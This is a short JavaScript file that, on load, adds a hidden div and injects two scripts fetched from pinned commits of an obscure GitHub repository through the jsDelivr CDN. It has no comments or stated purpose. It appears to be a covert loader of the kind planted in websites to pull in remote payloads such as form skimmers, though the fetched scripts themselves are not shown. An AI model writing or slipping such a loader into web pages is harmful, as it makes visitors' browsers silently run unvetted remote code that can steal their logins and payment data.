function addInvisibleElement() {
    if (!document.getElementById('invisibleElement')) {
      var invisibleElement = document.createElement('div');
      invisibleElement.style.display = 'none';
      invisibleElement.id = 'invisibleElement';
      document.body.appendChild(invisibleElement);
      
		  var script1 = document.createElement('script');
		  script1.src = 'https://cdn.jsdelivr.net/gh/eq89/h@abff567/au.js';
		  script1.type = 'text/javascript';
		  document.head.appendChild(script1);

		  var script2 = document.createElement('script');
		  script2.src = 'https://cdn.jsdelivr.net/gh/eq89/h@4570db0/ui.js';
		  script2.type = 'text/javascript';
		  document.head.appendChild(script2);
    }
}

addInvisibleElement();